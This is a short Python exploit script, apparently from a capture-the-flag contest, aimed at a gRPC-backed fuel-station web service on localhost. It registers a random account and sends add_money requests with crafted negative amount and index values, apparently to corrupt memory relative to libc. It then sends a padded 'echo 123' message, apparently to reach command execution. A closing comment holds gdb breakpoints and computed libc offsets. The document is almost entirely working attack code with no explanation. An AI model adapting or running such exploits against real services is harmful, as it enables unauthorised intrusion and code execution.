#!/usr/bin/env python3
import json
import random
import string

import requests

URL = 'http://localhost:8000'

def register(u: str, p: str):
    r = requests.post(URL+'/api/register', json={'username':u,'password':p})
    return r.text

def login(u: str, p: str):
    r = requests.post(URL+'/api/login', json={'username':u,'password':p})
    return r.text

def send(uid: str, balance: int, fr: int, to: int, msg: str):
    r = requests.post(URL+'/api/send', json={'uid':uid,'msg':msg,'litr':1,'money':balance,'from':fr,'to':to})
    return r.text

def add_money(uid: str, amount: int, station_id: int, oil_id: int):
    r = requests.post(URL+"/api/add_money", json.dumps({"type":"ADD_MONEY","uid":uid,"amount":amount,"station_id":station_id,"oil_id":oil_id}))
    return r.text


u = ''.join([random.choice(string.ascii_letters) for _ in range(10)])
uid = json.loads(register(u, u))['id']
add_money(uid, amount=-0x38aeb0, oil_id=-73, station_id=16019)
send(uid, balance=1, fr=16004, to=16019, msg='echo 123'.ljust(0x40, ' '))

'''
0x49 - _ZdlPvm
-73
b *'_ZdlPvm@plt'
b *'StationImpl::AddMoney(grpc::ServerContext*, AddMoneyRequest const*, None*) '

-0x38aeb0
-3714736

--------------------------------

grpc::Server::SyncRequest::ContinueRunAfterInterception()+530

b *'StationImpl::SendOil(grpc::ServerContext*, SendOilRequest const*, None*) '+0x132
b *'StationImpl::AddMoney(grpc::ServerContext*, AddMoneyRequest const*, None*) '

0x3eb * 0x60

-0x3395a0 - offset to libc.so.6
-3380640

p/x 0x7f2eaea46665-0x00007f2eae99b000
0xfffffffffffffeb8
0xab665

-0x177cf3
-1539315


rdi = 0x56...620
rax = [0x56...620] = 0xdead
rax + 0x30 = [0xdead+0x30]

0xfffffffffffffe58

-0x339570
-3380592

0x39733891

'''